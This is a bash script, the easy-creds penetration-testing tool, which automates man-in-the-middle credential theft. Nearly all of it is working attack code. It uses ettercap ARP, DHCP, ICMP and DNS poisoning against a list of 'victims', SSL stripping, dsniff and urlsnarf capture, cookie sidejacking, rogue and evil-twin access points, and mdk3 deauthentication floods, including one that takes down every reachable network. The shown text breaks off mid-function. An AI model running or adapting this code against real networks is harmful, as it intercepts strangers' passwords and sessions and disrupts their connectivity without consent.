#!/bin/bash

##################################################################################################################
# easy-creds is a simple bash script which makes sniffing networks for credentials a little easier.              #
#                                                                                                                #
# Make sure you check all logs for usernames and password, not all will show up in etter window.                 #
#                                                                                                                #
# Some Prerequisites:                                                                                            #
# You MUST edit your /etc/etter.conf file. I like to set the ID used for ettercap to 0.                          #
# You MUST also remove the comments (#) in front of the two lines for IPTables in order for SSL dissection to    #
# to work.                   											 #
# To use FakeAP, you must edit /etc/default/dhcp3-server by adding the at0 interface.                            #
#														 #
# J0hnnyBr@v0                                                                                                    #
##################################################################################################################
# v3.6-BT5 - 11/08/2011
#
# Copyright (C) 2011  Eric Milam
# This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
# License as published by the Free Software Foundation; either version 2 of the License, or any later version.
#
# This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied 
# warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along with this program; if not, write to the
# Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
##################################################################################################################

# 01001001 01000101 01110000 00110001 01100010 01101101 01100011 01101110 01011010 01101001 01000010 01101111 01011001 01111001 01000010 01101010 01100001 01000111 01010110 01111001 01100100 01010111 00110101 01101110 01100011 01101001 00110100 01110101 01011001 00110010 01101000 01101100 01011001 00110011 01101100 01111001 01001001 01000111 01100100 01111001 01100010 01101110 01101111 01100111 01100001 01101101 01010110 01111001 01100011 01001000 01101000 00110010 01011001 01011000 01010001 01100111 01100011 01000111 01010110 01111001 01100001 01101001 01000010 01110110 01100100 01101101 01001010 01101110 01100011 01001000 01010101 01101000

#Clear some variables
msfmysql=0
wireless=0
etterlaunch=0
offset=0
eviltwin=0
vercompare=0
dosattack=0
karmasploit=0
x=0
y=0

#Save the starting location path
location=$PWD

clear

# Catch ctrl-c input from user
trap f_Quit 2

#
# MISCELLANEOUS FUNCTIONS
#
##################################################
f_Exit(){
printf "\nPlease standby while we clean up your mess...\n"
sleep 3
killall ettercap python urlsnarf dsniff tail airbase-ng hamster ferret sleep &> /dev/null
service dhcp3-server stop &> /dev/null

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

echo "0" > /proc/sys/net/ipv4/ip_forward

if [ $msfmysql == 1 ] ; then
  service mysql stop &> /dev/null
fi

if [ $wireless == 1 ] ; then
  airmon-ng stop $MONMODE &> /dev/null
fi

if [ $dosattack == 1 ] ; then
  airmon-ng stop $dosmon &> /dev/null
  airmon-ng stop $airomon &> /dev/null
fi

if [ $karmasploit == 1 ] ; then
  kill $(cat /tmp/ec-karma-pid) &> /dev/null
fi

if [ $karmasploit == 1 ] ; then
 kill $(cat /tmp/ec-metasploit-pid) &> /dev/null
fi

clear
exit &> /dev/null
}

##################################################
f_Error(){
printf "\nInvalid Input.  Please try again\n"
sleep 3
}

##################################################
f_WrongPath(){
printf "\nInvalid Path.  Please try again\n"
sleep 3
}

##################################################
f_PrevMenu(){
echo ""
}

##################################################
f_Quit(){
printf "\nPlease standby while we clean up your mess...\n"
sleep 3
killall ettercap python urlsnarf dsniff tail airbase-ng hamster ferret sleep &> /dev/null
service dhcp3-server stop &> /dev/null

iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

echo "0" > /proc/sys/net/ipv4/ip_forward

if [ $msfmysql == 1 ] ; then
  service mysql stop &> /dev/null
fi

if [ $wireless == 1 ] ; then
  airmon-ng stop $MONMODE &> /dev/null
fi

if [ $dosattack == 1 ] ; then
  airmon-ng stop $dosmon &> /dev/null
  airmon-ng stop $airomon &> /dev/null
fi

if [ $karmasploit == 1 ] ; then
  kill $(cat /tmp/ec-karma-pid) &> /dev/null
fi

if [ $karmasploit == 1 ] ; then
 kill $(cat /tmp/ec-metasploit-pid) &> /dev/null
fi

bash $0
kill $$ &> /dev/null
}

##################################################
#
# PREREQ AND CONFIGURATION FUNCTIONS
#
##################################################
f_addtunnel(){
xterm -bg blue -fg white -geometry 90x25 -T "Add dhcpd Interface" -e nano /etc/default/dhcp3-server
f_prereqs
}

##################################################
f_nanoetter(){
xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter Conf" -e nano /etc/etter.conf
f_prereqs
}

##################################################
f_nanoetterdns(){
xterm -bg blue -fg white -geometry 125x100-0+0 -T "Edit Etter DNS" -e nano /usr/local/share/ettercap/etter.dns
f_prereqs
}

##################################################
f_dhcp3install(){
clear
f_Banner

printf "Installing dhcp3-server, please stand by.\n"
apt-get update && apt-get install dhcp3-server
printf "\nFinished installing dhcp3-server.\n"
sleep 3
f_prereqs
}

##################################################
f_karmareqs(){
clear
f_Banner

printf "Installing Karmetasploit Prerequisites, please standby.\n"
gem install activerecord
printf "\nFinished installing Karmetasploit Prerequisites.\n"
sleep 3
f_prereqs
}

##################################################
f_msf-update(){
clear
f_Banner

printf "Updating the Metasploit Framework, please stand by.\n"
msfupdate
printf "\nFinished updating the Metasploit Framework.\n"
sleep 3
f_prereqs
}

##################################################
f_aircrackupdate(){
clear
f_Banner

printf "Updating Aircrack, please stand by.\n"
cd /pentest/wireless/aircrack-ng && svn up
cd /pentest/wireless/aircrack-ng/scripts && bash airodump-ng-oui-update
printf "\nFinished updating Aircrack.\n"
sleep 3
cd $location
f_prereqs
}

##################################################
f_sslstrip_vercheck(){
clear
f_Banner

printf "\nChecking the thoughtcrime website for the latest version of SSLStrip...\n"

#Get the installed version
installedver=$(cat /pentest/web/sslstrip/setup.py|grep version|cut -d "'" -f2)

# Change to tmp folder to keep things clean then get the index.html from thoughtcrime.com for SSLStrip
cd /tmp/
wget -q http://www.thoughtcrime.org/software/sslstrip/index.html
latestver=$(cat index.html | grep "cd sslstrip"|cut -d "-" -f2)
#clean up the mess
rm /tmp/index.html
cd $location

vercompare=$(echo "$installedver < $latestver"|bc)

printf "\nInstalled version of SSLStrip: $installedver\n"
printf "\nLatest version of SSLStrip: $latestver\n"

if [ $vercompare == 1 ]; then
  printf "\nYou have version $installedver installed, version $latestver is available.\nWould you like to install the latest version? [y/N] "
  read -e sslstripupdate
  sslstripupdate="$(echo ${sslstripupdate} | tr 'A-Z' 'a-z')"

    if [ -z $sslstripupdate ]; then
      printf "\nOK, maybe next time...\n"
      sleep 3
    else
      f_sslstripupdate
    fi
else
  printf "\nLooks like you're running the latest version available.\n"
  sleep 5
fi

f_prereqs
}

##################################################
f_sslstripupdate(){
clear
f_Banner

printf "\nThis will install SSLStrip from the thoughtcrime website, not the BackTrack repositories.\nHit return to continue or ctrl-c to cancel and return to main menu."
read $continue

mv /pentest/web/sslstrip/ /pentest/web/sslstrip-$installedver

printf "\nDownloading the tar file...\n"
cd /tmp
wget -q http://www.thoughtcrime.org/software/sslstrip/sslstrip-$latestver.tar.gz
sleep 2

printf "\nInstalling the latest version of SSLStrip...\n"
tar zxvf sslstrip-$latestver.tar.gz
mv -f /tmp/sslstrip-$latestver/ /pentest/web/sslstrip/
cd $location
sleep 2

printf "\nVersion $latestver has been installed.\n"
sleep 2

#clean up the mess
rm -rf /tmp/sslstrip-$latestver
rm /tmp/sslstrip-$latestver.tar.gz
}

##################################################
#
# POISONING ATTACK FUNCTIONS
#
##################################################
f_HostScan(){
# Coded with help from 'Crusty Old Fart' - Ubuntu Forums
clear
f_Banner

printf "Enter your target network range (nmap format): "
read -e range

if [ -z $range ]; then
	f_Error
	f_HostScan
fi

printf "Performing an ARP scan to identify live devices, this may take a bit."

sleep 3

nmap -sP -n "$range" -oN /tmp/nmap.scan

declare -a nmap_array=($(
grep -e report -e MAC /tmp/nmap.scan | \
sed -e '{
	s/Nmap scan report for //g
	s/MAC Address: //g
	s/ (.\+//g
	}'
))

nmap_array_len=${#nmap_array[@]}
echo -n > /$PWD/victims

for (( i = 0; i <= $nmap_array_len; i++ )); do
	while (( $(echo ${nmap_array[$i]} | grep -c '[0-9A-F]\+:') < 1 )); do
		(( i++ ))
	done
	echo ${nmap_array[(( $i - 1 ))]} ${nmap_array[$i]} '-' >> /$PWD/victims
	(( i++ ))
done

printf "\nYour victim host list is at $PWD/victims.\n\nRemember to remove any IPs that should not be poisoned!\n" 

sleep 7

}

##################################################
f_setup(){
printf "Network Interfaces:\n"
ifconfig | grep Link| grep -v lo
printf "\nInterface connected to the network, example eth0: "
read -e IFACE

if [ -z $IFACE ]; then
	f_Error
	f_setup
fi

# Create a folder for log files just to keep things clean.
printf "\nProvide path for saving log files, ex. root, *NOT* /root/: "
read -e fldrpath

if [ -z $fldrpath ]; then
	f_Error
	f_setup
fi

fldrtime=easy-creds-$(date +%F-%H%M)

#printf "\nCreating folder to keep your attack output in...\n"
#mkdir -p /$fldrpath/$fldrtime

printf "\nSetting up iptables to handle traffic routing."
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 3

# xterm window variables
x="0"					# x offset value
y="0"					# y offset value
width="100"				# width value
height="7"				# height value
yoffset="120"				# y offset
}

##################################################
f_Standard(){
clear
f_Banner

f_setup

printf "\nDo you have a populated file of victims to use? (y/n): "
read -e VICFILE

if [ -z $VICFILE ]; then
	f_Error
	f_Standard
fi

VICFILE="$(echo ${VICFILE} | tr 'A-Z' 'a-z')"

if [ $VICFILE == "y" ]; then
	etterlaunch=1
	printf "Path to the vicitm list file: "
	read -e VICLIST
	
	if [ -z $VICLIST ]; then
		f_Error
		f_Standard
	fi
	if [ ! -f $VICLIST ]; then
		f_WrongPath
		f_Standard
	fi
	printf "IP address of the gateway: "
	read -e GW

	if [ -z $GW ]; then
		f_Error
		f_Standard
	fi
else
	etterlaunch=2
	printf "IP address of the gateway: "
	read -e GW

	if [ -z $GW ]; then
		f_Error
		f_Standard
	fi

	printf "IP address or range of IPs to poison (ettercap format): "
	read -e VICS

	if [ -z $VICS ]; then
		f_Error
		f_Standard
	fi
fi

sleep 5

f_finalstage
}

##################################################
f_Oneway(){
clear
f_Banner

f_setup

printf "Do you have a populated file of victims to use? (y/n) "
read -e VICFILE

if [ -z $VICFILE ]; then
	f_Error
	f_Oneway
fi

VICFILE="$(echo ${VICFILE} | tr 'A-Z' 'a-z')"

if [ $VICFILE == "y" ]; then
	etterlaunch=3
	printf "Path to the vicitm list file: "
	read -e VICLIST

	if [ -z $VICLIST ]; then
		f_Error
		f_Oneway
	fi
	if [ ! -f $VICLIST ]; then
		f_WrongPath
		f_Oneway
	fi
	printf "IP address of the gateway: "
	read -e GW

	if [ -z $GW ]; then
		f_Error
		f_Oneway
	fi
else
	etterlaunch=4
	printf "IP address of the gateway: "
	read -e GW

	if [ -z $GW ]; then
		f_Error
		f_Oneway
	fi

	printf "IP address or range of IPs to poison (ettercap format): "
	read -e VICS

	if [ -z $VICS ]; then
		f_Error
		f_Oneway
	fi
fi

sleep 5

f_finalstage
}

##################################################
f_DHCPPoison(){
clear
f_Banner

f_setup

printf "Pool of IP address to assign to your victims: "
read -e POOL

if [ -z "$POOL" ]; then
	f_Error
	f_DHCPPoison
fi

printf "Netmask to assign to your victims: "
read -e MASK

if [ -z $MASK ]; then
	f_Error
	f_DHCPPoison
fi

printf "DNS IP to assign to your victims: "
read -e DNS

if [ -z $DNS ]; then
	f_Error
	f_DHCPPoison
fi

etterlaunch=5

sleep 5

f_finalstage
}

##################################################
f_DNSPoison(){
clear
f_Banner

f_setup

printf "Do you have a populated file of victims to use? (y/n) "
read -e VICFILE

if [ -z $VICFILE ]; then
	f_Error
	f_DNSPoison
fi

VICFILE="$(echo ${VICFILE} | tr 'A-Z' 'a-z')"

if [ $VICFILE == "y" ]; then
	etterlaunch=8
	printf "Path to the vicitm list file: "
	read -e VICLIST

	if [ -z $VICLIST ]; then
		f_Error
		f_DNSPoison
	fi
	if [ ! -f $VICLIST ]; then
		f_WrongPath
		f_DNSPoison
	fi
	printf "IP address of the gateway: "
	read -e GW

	if [ -z $GW ]; then
		f_Error
		f_DNSPoison
	fi
else
	etterlaunch=9
	printf "IP address of the gateway: "
	read -e GW

	if [ -z $GW ]; then
		f_Error
		f_DNSPoison
	fi

	printf "IP address or range of IPs to poison (ettercap format): "
	read -e VICS

	if [ -z "$VICS" ]; then
		f_Error
		f_DNSPoison
	fi
fi

sleep 5

f_finalstage
}

##################################################
f_ICMPPoison(){
clear
f_Banner

f_setup

printf "MAC address of the gateway: "
read -e GATEMAC

if [ -z $GATEMAC ]; then
	f_Error
	f_ICMPPoison
fi

printf "IP address of the gateway: "
read -e GATEIP

if [ -z $GATEIP ]; then
	f_Error
	f_ICMPPoison
fi

etterlaunch=6

f_finalstage
}

##################################################
f_sidejack(){
printf "\nStarting Hamster & Ferret...\n"
cd /$fldrpath/$fldrtime
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -bg black -fg white -T "Ferret" -e /pentest/sniffers/hamster/ferret -i $IFACE &
sleep 3

y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -bg white -fg black -T "Hamster" -e /pentest/sniffers/hamster/hamster &
cd $location
sleep 3
printf "Run firefox and type http://hamster\n"
printf "Don't forget to set the proxy to 127.0.0.1:1234\n"
sleep 7
}

##################################################
f_ecap(){
printf "\nLaunching ettercap, poisoning specified hosts.\n"

if [ $etterlaunch == 1 ] ; then
#MITM ARP Poision - gateway and targets between the //'s or leave blank to poision all hosts on subnet (Use with caution)
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -M arp:remote -T -j "$VICLIST" -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $IFACE /$GW/ // &

elif [ $etterlaunch == 2 ] ; then
# MITM ARP Poision - gateway and targets between the //'s or leave blank to poision all hosts on subnet (Use with caution)
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -M arp:remote -T -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $IFACE /$GW/ /"$VICS"/ &

elif [ $etterlaunch == 3 ] ; then
# MITM ARP Poision Oneway - oneway config is /targets/ /gateway/ to poison clients only
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -M arp:oneway -T -j $VICLIST -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $IFACE // /$GW/ &

elif [ $etterlaunch == 4 ] ; then
# MITM ARP Poision Oneway - oneway config is /targets/ /gateway/ to poison clients only
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -M arp:oneway -T -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $IFACE /"$VICS"/ /$GW/ &

elif [ $etterlaunch == 5 ] ; then
# MITM DHCP Poision - config is dhcp:IP Addresses/Netmask/DNS Server IP
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -T -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $IFACE -M dhcp:"$POOL"/$MASK/$DNS/ &

elif [ $etterlaunch == 6 ] ; then
# MITM ICMP Poision - config is ICMP:GATEWAYMAC/GATEWAYIP
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -T -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $IFACE -M icmp:$GATEMAC/$GATEIP &

elif [ $etterlaunch == 7 ] ; then
# FAKEAP Ettercap
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -T -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $TUNIFACE // // &

elif [ $etterlaunch == 8 ] ; then
# MITM DNS Poison - leverages the dns_spoof plugin, you must edit etter.dns (prereq section)
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -j "$VICLIST" -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $IFACE /$GW/ // &

elif [ $etterlaunch == 9 ] ; then
# MITM DNS Poison - leverages the dns_spoof plugin, you must edit etter.dns (prereq section)
xterm -geometry "$width"x$height-$x+$y -T "Ettercap" -l -lf /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M).txt -bg white -fg black -e ettercap -a /etc/etter.conf -P dns_spoof -M arp -T -q -l /$fldrpath/$fldrtime/ettercap$(date +%F-%H%M) -i $IFACE /$GW/ /"$VICS"/ &

sleep 3
fi
}

##################################################
#
# FAKE AP ATTACK FUNCTIONS
#
##################################################
f_fakeapAttack(){

wireless=1
offset=1

# Credit to Lucafa's post on the Offensive-Security forums, used as a base
clear
f_Banner

# xterm window variables
x="0"					# x offset value
y="0"					# y offset value
width="100"				# width value
height="7"				# height value
yoffset="120"				# y offset

# Create a folder for log files just to keep things clean.

printf "Provide path for saving log files, ex. root, *NOT* /root/: "
read -e fldrpath

if [ -z $fldrpath ]; then
	f_Error
	f_fakeapAttack
fi

fldrtime=easy-creds-$(date +%F-%H%M)

printf "\nWould you like to include a sidejacking attack? (y/n): "
read -e SIDEJACK

printf "\nNetwork Interfaces:\n"
ifconfig | grep Link| grep -v lo
printf "Interface connected to the internet, example eth0: "
read -e IFACE

if [ -z $IFACE ]; then
	f_Error
	f_fakeapAttack
fi

airmon-ng

printf "Wireless interface name, example wlan0: "
read -e WIFACE

if [ -z $WIFACE ]; then
	f_Error
	f_fakeapAttack
fi

if [ $eviltwin == 0 ]; then
	printf "ESSID you would like your rogue AP to be called, example FreeWiFi: "
	read -e ESSID

	if [ -z "$ESSID" ]; then
		f_Error
		f_fakeapAttack
	fi
fi

if [ $eviltwin == 0 ]; then
  printf "Channel you would like to broadcast on: "
  read -e CHAN

    if [ -z $CHAN ]; then
	    f_Error
	    f_fakeapAttack
    fi
fi

if [ $eviltwin == 1 ]; then
  airmon-ng start $WIFACE &> /dev/null
else
  airmon-ng start $WIFACE $CHAN &> /dev/null
fi
sleep 3

modprobe tun

printf "\n*** Your interface has now been placed in Monitor Mode ***\n"
airmon-ng | grep mon
printf "\nEnter your monitor enabled interface name, example mon0: "
read -e MONMODE

if [ -z $MONMODE ]; then
	f_Error
	f_fakeapAttack
fi

printf "Enter your tunnel interface, example at0: "
read -e TUNIFACE

if [ -z $TUNIFACE ]; then
	f_Error
	f_fakeapAttack
fi

printf "Do you have a populated dhcpd.conf file to use? (y/n) "
read -e DHCPFILE

if [ -z $DHCPFILE ]; then
	f_Error
	f_fakeapAttack
fi

DHCPFILE="$(echo ${DHCPFILE} | tr 'A-Z' 'a-z')"

if [ $DHCPFILE == "y" ]; then
  f_dhcpconf
  f_dhcptunnel
else
  f_dhcpmanual
  f_dhcptunnel
fi
}

##################################################
f_dhcpconf(){
printf "Path to the dhcpd.conf file (should be in the /etc/dhcp3/ folder): "
read -e DHCPPATH

if [ -z $DHCPPATH ]; then
	f_Error
	f_Standard
	fi
if [ ! -f $DHCPPATH ]; then
	f_WrongPath
	f_Standard
fi

#If your DHCP conf file is setup properly, this will work, otherwise you need to tweak it
ATNET=$(cat $DHCPPATH |grep -i subnet|cut -d" " -f2)
ATIP=$(cat $DHCPPATH |grep -i "option routers"|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
ATSUB=$(cat $DHCPPATH |grep -i subnet|cut -d" " -f4)
ATCIDR=$(ipcalc -b $ATNET/$ATSUB|grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\/[0-9]\{1,2\}')
}

##################################################
f_dhcpmanual(){
  
  DHCPPATH=/etc/dhcp3/dhcpd-ec.conf

  printf "Network range for your tunneled interface, example 10.0.0.0/24: "
  read -e ATCIDR  
  if [ -z "$ATCIDR" ]; then
	  f_Error
	  f_dhcpmanual
  fi

  #Check for incorrect subnetmask
  sub=$(echo $ATCIDR|cut -d '/' -f2)
  max=32
  if [ "$sub" -gt "$max" ]; then
	f_Error
	f_dhcpmanual
  fi

  echo $ATCIDR | grep '/' &> /dev/null
  if [ $? -ne 0 ]; then
	f_Error
	f_dhcpmanual
  fi

  echo $ATCIDR | grep [[:alpha:]\|[,\\]] &> /dev/null
  if [ $? -eq 0 ]; then
	f_Error
	f_dhcpmanual
  fi

  printf "Enter the IP address for the DNS server, example 8.8.8.8: "
  read -e ATDNS

  if [ -z $ATDNS ]; then
	  f_Error
	  f_dhcpmanual
  fi

#use ipcalc to complete the DHCP setup
  ipcalc "$ATCIDR" > /tmp/atcidr
  ATNET=$(cat /tmp/atcidr|grep Address| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
  ATIP=$(cat /tmp/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
  ATSUB=$(cat /tmp/atcidr|grep Netmask| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
  ATBROAD=$(cat /tmp/atcidr|grep Broadcast| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}')
  ATLSTARTTMP=$(cat /tmp/atcidr|grep HostMin| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
  ATLSTART=$(echo $ATLSTARTTMP.100)
  ATLENDTMP=$(cat /tmp/atcidr|grep HostMax| grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'|cut -d"." -f1-3)
  ATLEND=$(echo $ATLENDTMP.200)

printf "\n\nCreating a dhcpd.conf to assign addresses to clients that connect to us."
echo "ddns-update-style none;" > /etc/dhcp3/dhcpd-ec.conf
echo "authoritative;"  >> /etc/dhcp3/dhcpd-ec.conf
echo "log-facility local7;"  >> /etc/dhcp3/dhcpd-ec.conf
echo "subnet $ATNET netmask $ATSUB {"  >> /etc/dhcp3/dhcpd-ec.conf
echo "	range $ATLSTART $ATLEND;"  >> /etc/dhcp3/dhcpd-ec.conf
echo "	option domain-name-servers $ATDNS;"  >> /etc/dhcp3/dhcpd-ec.conf
echo "	option routers $ATIP;"  >> /etc/dhcp3/dhcpd-ec.conf
echo "	option broadcast-address $ATBROAD;"  >> /etc/dhcp3/dhcpd-ec.conf
echo "	default-lease-time 600;" >> /etc/dhcp3/dhcpd-ec.conf
echo "	max-lease-time 7200;"  >> /etc/dhcp3/dhcpd-ec.conf
echo "}" >> /etc/dhcp3/dhcpd-ec.conf
}

##################################################
f_dhcptunnel(){

# airbase-ng is going to create our fake AP with the SSID we specified
printf "\nLaunching Airbase with your settings.\n"

if [ $eviltwin == 1 ] ; then
  xterm -geometry "$width"x$height-$x+$y -T "Airbase-NG" -e airbase-ng -P -C 60 -e "$ESSID" $MONMODE &
else
  xterm -geometry "$width"x$height-$x+$y -T "Airbase-NG" -e airbase-ng -e "$ESSID" -c $CHAN $MONMODE &
fi
sleep 7

printf "\nConfiguring tunneled interface.\n"
ifconfig $TUNIFACE up
ifconfig $TUNIFACE $ATIP netmask $ATSUB
ifconfig $TUNIFACE mtu 1400
route add -net $ATNET netmask $ATSUB gw $ATIP dev $TUNIFACE
sleep 2

printf "\nSetting up iptables to handle traffic seen by the tunneled interface.\n"
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
sleep 2

printf "\nLaunching Tail.\n"
y=$(($y+$yoffset))
xterm -geometry "$width"x$height-$x+$y -T "DMESG" -bg black -fg red -e tail -f /var/log/messages &
sleep 3

printf "\nDHCP server starting on tunneled interface.\n"
dhcpd3 -q -cf $DHCPPATH -pf /var/run/dhcp3-server/dhcpd.pid $TUNIFACE &
sleep 3

etterlaunch=7

f_finalstage
}

##################################################
f_finalstage(){

printf "\nCreating folder to keep your attack output in...\n"
mkdir -p /$fldrpath/$fldrtime

if [ $wireless == 0 ]; then
	printf "\nWould you like to include a sidejacking attack? (y/n): "
	read -e SIDEJACK
	SIDEJACK="$(echo ${SIDEJACK} | tr 'A-Z' 'a-z')"
fi

if [ "$etterlaunch" -lt 8 ]; then
	printf "\nLaunching SSLStrip.\n"

	if [ $offset == 1 ]; then
  	y=$(($y+$yoffset))
	fi
  
	xterm -geometry "$width"x$height-$x+$y -bg blue -fg white -T "SSLStrip" -e python /pentest/web/sslstrip/sslstrip.py -pfk -w /$fldrpath/$fldrtime/sslstrip$(date +%F-%H%M).log &
	sleep 3
fi

f_ecap
sleep 3

printf "\nConfiguring IP forwarding.\n"
echo "1" > /proc/sys/net/ipv4/ip_forward
sleep 3

printf "\nLaunching URLSnarf.\n"
if [ $wireless == 1 ]; then
	y=$(($y+$yoffset))
	xterm -geometry "$width"x$height-$x+$y -T "URL Snarf" -l -lf /$fldrpath/$fldrtime/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i $TUNIFACE &
	sleep 3
else
	y=$(($y+$yoffset))
	xterm -geometry "$width"x$height-$x+$y -T "URL Snarf" -l -lf /$fldrpath/$fldrtime/urlsnarf-$(date +%F-%H%M).txt -bg black -fg green -e urlsnarf  -i $IFACE &
	sleep 3
fi

printf "\nLaunching Dsniff.\n"
if [ $wireless == 1 ]; then
	y=$(($y+$yoffset))
	xterm -geometry "$width"x$height-$x+$y -T "Dsniff" -bg blue -fg white -e dsniff -m -i $TUNIFACE -w /$fldrpath/$fldrtime/dsniff$(date +%F-%H%M).log &
	sleep 3
else
	y=$(($y+$yoffset))
	xterm -geometry "$width"x$height-$x+$y -T "Dsniff" -bg blue -fg white -e dsniff -m -i $IFACE -w /$fldrpath/$fldrtime/dsniff$(date +%F-%H%M).log &
	sleep 3
fi

if [ $SIDEJACK == "y" ]; then
	f_sidejack
fi

printf "\nTime to make it rain...  Enjoy!"
sleep 5
}

##################################################
f_fakeapeviltwin(){
eviltwin=1
ESSID=default
f_fakeapAttack
}
##################################################
f_mdk3aps(){
clear
f_Banner

dosattack=1

# grep the MACs to a temp white list
ifconfig -a| grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec-white.lst

printf "\nDo you have the BSSID address of the AP you'd like to attack? [Y/n]: "
read -e havemac

if [ -z $havemac ]; then
	havemac=y
fi

havemac="$(echo ${havemac} | tr 'A-Z' 'a-z')"

if [ $havemac == "n" ]; then
	f_getbssids
else	
	
	printf "\nPlease enter the BSSID address of the AP you wish to DoS: "
	read -e dosmac

	if [ -z $dosmac ]; then
	f_Error
	f_singleap
	fi

	#Need to add MAC address validation here!!

	echo "$dosmac" > /tmp/ec-dosap
	
	airmon-ng | grep wlan

	printf "\nPlease enter the wireless device to use for DoS attack: "
	read -e doswlan

	printf "\nPlacing the wireless card in monitor mode to perform DoS attack.\n"
	airmon-ng start $doswlan
	sleep 3

	airmon-ng | grep mon

	printf "\nPlease enter the device to perform the attack from (i.e. mon1): "
	read -e dosmon

	printf "\nPlease stand by while we DoS the AP with BSSID Address $dosmac..."
	sleep 3
	xterm -geometry "$width"x$height+$x-$y -T "MDK3 AP DoS" -e mdk3 $dosmon d -b /tmp/ec-dosap &
	echo $! > /tmp/dosap-pid
	sleep 5m && kill $(cat /tmp/dosap-pid) &
	printf "\nAttack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack..."
fi

sleep 5
}

##################################################
f_lastman(){
clear
f_Banner

dosattack=1

printf "\n!!!THIS ATTACK REQUIRES A 2nd WIRELESS CARD!!!\n"
printf "\nThis attack will DoS every AP BSSID & Client MAC it can reach.\nUse with *Extreme* caution\n\n"

# grep the MACs to a temp white list
ifconfig | grep wlan| grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' > /tmp/ec-white.lst

airmon-ng | egrep '(wlan|mon)'

printf "\nPlease enter the wireless device to use for DoS attack: "
read -e doswlan

printf "\nPlacing the wireless card in monitor mode to perform DoS attack.\n"
airmon-ng start $doswlan &
sleep 3

airmon-ng | grep mon

printf "\nPlease enter the device to perform the attack from (i.e. mon1): "
read -e dosmon

xterm -geometry 70x10+0-0 -T "Last Man Standing" -e mdk3 $dosmon d -w /tmp/ec-white.lst &
echo $! > /tmp/dosap-pid
sleep 5m && kill $(cat /tmp/dosap-pid) &
printf "\nAttack will run for 5 minutes or you can close the xterm window to stop the AP DoS attack..."
